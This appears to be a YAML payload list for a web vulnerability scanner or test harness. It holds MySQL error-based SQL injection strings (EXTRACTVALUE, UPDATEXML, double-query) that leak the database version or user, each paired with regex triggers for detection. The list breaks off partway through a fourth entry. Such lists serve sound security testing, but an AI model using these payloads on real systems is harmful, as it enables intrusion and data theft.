- id: sqli-error-001
  class: sqli
  payload: 1' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) -- -
  trigger:
    kind: any_of
    any_of:
    - kind: regex
      pattern: XPATH|syntax|First name
    - kind: regex
      pattern: SQLITE_ERROR|no such function
  cwe: CWE-89
  source: PayloadsAllTheThings — MySQL error-based
- id: sqli-error-002
  class: sqli
  payload: 1' AND UPDATEXML(1, CONCAT(0x7e, user()), 1) -- -
  trigger:
    kind: any_of
    any_of:
    - kind: regex
      pattern: XPATH|syntax|First name
    - kind: regex
      pattern: SQLITE_ERROR|no such function
  cwe: CWE-89
  source: PayloadsAllTheThings — UPDATEXML error leak
- id: sqli-error-003
  class: sqli
  payload: 1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP
    BY x)a) -- -
  trigger:
    kind: any_of
    any_of:
    - kind: regex
      pattern: duplicate|First name|syntax
    - kind: regex
      pattern: SQLITE_ERROR|no such table
  cwe: CWE-89
  source: PayloadsAllTheThings — double-query error
- id: sqli-auth-001
  class: sqli
